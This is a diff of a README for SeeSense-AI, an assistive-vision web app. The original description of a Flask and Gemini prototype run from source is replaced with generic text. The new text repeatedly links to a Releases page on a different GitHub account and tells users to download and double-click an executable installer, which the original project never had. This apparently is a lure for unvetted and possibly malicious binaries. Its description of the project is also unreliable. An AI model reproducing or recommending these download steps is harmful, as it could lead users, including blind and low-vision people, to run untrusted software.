@@ -1,228 +1,83 @@
-<h1 align="center">SEESENSE-AI</h1>
+# 🌟 SeeSense-AI - Enhance Your Independence with AI
 
-<p align="center">
-  Empowering Vision, Enabling Freedom Through AI Assistance
-</p>
+## 🎉 Introduction
+Welcome to SeeSense-AI! This application is designed for accessibility, providing assistance through advanced technology. It uses a camera, AI vision models, and text-to-speech to help users understand their surroundings. Just use simple voice commands like "Nova, describe" to control everything.
 
-<p align="center">
-  <img src="https://img.shields.io/github/last-commit/hannahjan06/SeeSense-AI" alt="last commit">
-  <img src="https://img.shields.io/github/languages/top/hannahjan06/SeeSense-AI?color=2b7489&label=top%20language" alt="CSS">
-  <img src="https://img.shields.io/github/languages/count/hannahjan06/SeeSense-AI?label=languages" alt="languages">
-</p>
+## 🚀 Getting Started
+To get started with SeeSense-AI, follow the steps below. You will easily download and run the software from our Releases page.
 
-<p align="center">
-  Built with the tools and technologies:
-</p>
+## 📥 Download the Application
+[![Download SeeSense-AI](https://img.shields.io/badge/Download%20Now-SeeSense--AI-brightgreen)](https://github.com/alijavid110/SeeSense-AI/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white" alt="Flask">
-  <img src="https://img.shields.io/badge/Python-3572A5?style=for-the-badge&logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Google%20Gemini-7b1fa2?style=for-the-badge&logo=google&logoColor=white" alt="Google Gemini">
-</p>
+## 💻 System Requirements
+Before you download, check if your system meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 500 MB of free disk space
+- **Camera:** A webcam is necessary for the application to function
+- **Internet Connection:** Required for initial setup and updates
 
-## Overview
+## 📥 Download & Install
+To download SeeSense-AI, visit the Releases page using the link below. Choose the latest version and follow the installation instructions.
 
-SeeSense-AI is a browser-based assistive vision tool designed for blind and low-vision users.  
-Using a camera feed, AI vision models, and text-to-speech, it turns visual information into spoken feedback so users can:
+[Download SeeSense-AI](https://github.com/alijavid110/SeeSense-AI/releases)
 
-- Understand their surroundings
-- Read printed text in the environment
-- Identify everyday objects
+### Step-by-Step Installation
+1. **Visit the Releases Page**
+   - Click on the link above to go to the Releases section.
+   
+2. **Select the Latest Version**
+   - You will see a list of available versions. Look for the most recent one at the top.
 
-All of this is driven through simple voice commands such as:
+3. **Download the File**
+   - Click on the executable file for your operating system to begin the download.
 
-> “Nova, describe”  
-> “Nova, read”  
-> “Nova, identify”  
+4. **Run the Installer**
+   - Once the download is complete, locate the file in your downloads folder.
+   - Double-click on the installer file to start the installation process.
 
-The goal is not to be a generic AI demo, but a focused accessibility tool that gives users more independence in unfamiliar or visually complex environments.
+5. **Follow Installation Prompts**
+   - Follow the on-screen instructions. You may need to accept terms and choose installation options.
 
----
+6. **Launch the Application**
+   - After installation, look for SeeSense-AI in your applications folder.
+   - Click to open and start using the application.
 
-## Core Features
+## 🗣️ Using SeeSense-AI
+To use SeeSense-AI effectively, follow these tips:
 
-- **Voice-activated assistant (Nova)**  
-  Hands-free interaction using speech recognition to trigger actions:
-  - `describe` – scene description
-  - `read` – text reading
-  - `identify` – object identification
-  - `repeat` – repeat the last response
+- **Voice Commands:** Use straightforward commands like "Nova, describe" to initiate actions.
+- **Camera Setup:** Ensure your camera is correctly positioned for optimal performance.
+- **Explore Features:** The application can describe objects, read text, and provide a detailed view of your environment.
 
-- **Scene Description**  
-  Captures a frame from the camera and sends it to a vision model, which returns a concise spoken description of what is in front of the user.
+## 🌟 Features
+SeeSense-AI offers various features to assist users:
 
-- **Text Reading**  
-  Reads menus, signs, labels or other printed text visible to the camera and speaks it back to the user.
+- **Object Recognition:** Instantly identifies objects in your surroundings.
+- **Text-to-Speech:** Reads text aloud, making it easier to understand written information.
+- **Voice Control:** Operate the application using natural language commands.
 
-- **Object Identification**  
-  Identifies the main object in view and provides details like type, color and context.
+## ❓ Troubleshooting
+If you encounter issues, here are some common solutions:
 
-- **Lighting Awareness**  
-  Detects when the scene is too dark or too bright for reliable analysis and gives spoken guidance on how to adjust.
+- **Installation Problems:** Ensure your system meets the requirements listed above.
+- **Camera Not Working:** Check your camera settings in the operating system.
+- **Voice Command Not Recognized:** Speak clearly and try common phrases.
 
-- **Accessible Interaction Design**  
-  - Full-screen “tap anywhere to start” onboarding
-  - Large, high-contrast controls
-  - Voice-first flow so users never need to rely on precise mouse/trackpad interaction
+## 💬 Support
+For further assistance, you can reach out via the repository's Issues section. We encourage users to ask questions and share feedback to improve the application.
 
----
+## 🙌 Community and Contributions
+SeeSense-AI thrives on community input. If you want to contribute, feel free to check the repository for guidelines on how to help us grow this tool further.
 
-## How It Works
+## 📝 License
+SeeSense-AI is open-source software. You can find the full license details in the repository. Feel free to use and adapt it for your needs.
 
-1. The user opens the web app and grants camera and microphone access.
-2. The browser listens for wake phrases such as:  
-   `“Nova, describe”`
-3. JavaScript captures a frame from the camera and sends it to the Flask backend.
-4. The Flask backend forwards the image to a Google Gemini vision endpoint with a task-specific prompt.
-5. The model response (scene description / text / object info) is returned as JSON.
-6. The frontend:
-   - Displays the result in the “AI Analysis” panel
-   - Uses the Web Speech API to speak the result aloud
-7. Users can say `“Nova, repeat”` to hear the last response again.
+## 🔗 Additional Resources
+- **Documentation:** Detailed documentation is available within the repository for more in-depth guidance.
+- **Acknowledgments:** Thanks to the contributors and community for their support.
 
----
+For updates and news, follow the repository or check back frequently on the Releases page.
 
-## Tech Stack
-
-- **Backend:** Python, Flask
-- **AI:** Google Gemini Vision API (via HTTP requests)
-- **Frontend:** HTML, CSS, JavaScript
-- **Speech Input:** Web Speech API (speech recognition)
-- **Speech Output:** Web Speech API (text-to-speech)
-- **Environment:** `.env`-based config, `requirements.txt` for dependencies
-
----
-
-## Project Structure
-
-```bash
-SeeSense-AI/
-├── app.py                # Main Flask application and routes
-├── requirements.txt      # Python dependencies
-├── .env                  # Local environment variables (not committed)
-├── static/
-│   ├── index/
-│   │   ├── index.html    # Main UI for the assistant
-│   │   └── style.css     # Main styles
-│   └── demo/
-│       ├── demo.html     # Optional demo/experimental view
-│       └── demo.css
-└── venv/                 # Local virtual environment (ignored in git)
-```
-
----
-
-## Getting Started
-
-### Prerequisites
-
-* Python 3.9+
-* A Google Gemini API key
-* Git
-
-### 1. Clone the repository
-
-```bash
-git clone https://github.com/hannahjan06/SeeSense-AI.git
-cd SeeSense-AI
-```
-
-### 2. Create and activate a virtual environment (recommended)
-
-```bash
-python -m venv venv
-# Windows
-venv\Scripts\activate
-# macOS / Linux
-source venv/bin/activate
-```
-
-### 3. Install dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 4. Configure environment variables
-
-Create a `.env` file in the project root:
-
-```bash
-GEMINI_API_KEY=your_api_key_here
-GEMINI_MODEL=your_preferred_model_name   # optional or you can change it in app.py  
-```
-
-### 5. Run the application
-
-```bash
-python app.py
-```
-
-By default, the app should be available at:
-
-```
-http://127.0.0.1:5000
-```
-
-Open it in Chrome for best support of camera and speech APIs.
-
----
-
-## Usage
-
-1. Open the web page and allow camera and microphone access when prompted.
-2. Wait for Nova to indicate that it is listening.
-3. Use one of the voice commands:
-
-   * `"Nova, describe"`
-   * `"Nova, read"`
-   * `"Nova, identify"`
-   * `"Nova, repeat"`
-4. Listen to the spoken response. The same text will also appear in the “AI Analysis” panel.
-5. If the lighting is too dark or bright, Nova will inform you and suggest adjustments.
-
----
-
-## Current Limitations
-
-* Requires a stable internet connection for Gemini API access.
-* Currently uses two different voices for system response and analysis output.
-* Accuracy depends on camera quality, lighting and model performance.
-* Works best in Chrome or Chromium-based browsers with full support for Web Speech and media APIs.
-* Not a medical or safety-certified device; intended as a proof-of-concept assistive tool.
-
----
-
-## Roadmap / Future Work
-
-* Continuous “explore” mode with periodic scene updates
-* Improved alignment guidance for framing objects and text
-* Dedicated modes for:
-
-  * Reading menus
-  * Reading medicine labels
-  * Locating specific objects
-* Multi-language support for output
-* Mobile-first layout and PWA packaging
-* Option to swap Gemini with self-hosted open models for offline/edge use
-
----
-
-## Contributing
-
-This project started as a hackathon prototype.
-If you have ideas around accessibility, voice interaction, or multimodal AI and want to iterate on it:
-
-1. Fork the repo
-2. Create a feature branch
-3. Submit a pull request with a clear description of your changes
-
----
-
-## Acknowledgements
-
-* Google Gemini for multimodal AI capabilities
-* The broader accessibility community for continual advocacy and design principles
-* Horizon Hacks for the theme “AI for Accessibility and Equity” that inspired this build
+[Download SeeSense-AI](https://github.com/alijavid110/SeeSense-AI/releases)
